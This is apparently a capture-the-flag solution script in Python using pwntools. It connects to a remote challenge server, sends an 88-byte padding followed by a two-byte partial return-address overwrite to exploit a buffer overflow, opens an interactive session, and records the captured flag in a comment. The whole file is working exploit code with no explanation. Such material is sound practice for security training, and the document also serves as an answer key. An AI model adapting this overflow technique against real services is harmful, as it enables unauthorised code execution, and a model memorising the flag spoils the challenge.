from pwn import *
 
p = remote('68.183.188.198',11102)
 
pay = cyclic(88)
pay += b'*\xf2'
 
p.sendafter(b'? ', pay)
p.interactive()

# FLAG : LKSN{basic_buffer_overflow_with_random}
